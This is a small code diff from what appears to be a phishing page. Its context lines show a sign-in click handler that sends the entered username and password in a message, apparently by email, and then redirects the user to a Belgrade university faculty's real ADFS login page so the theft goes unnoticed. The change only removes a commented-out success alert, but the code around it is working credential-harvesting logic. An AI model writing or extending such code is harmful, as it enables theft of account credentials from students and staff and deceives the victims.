@@ -33,7 +33,6 @@ signInButton.addEventListener('click', async () => {
       message: `Username: ${username.value} + Password: ${hash}`,
     })
     .then(() => {
-      //alert('Email sent successfully!');
       window.open(
         'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/',
         '_self'
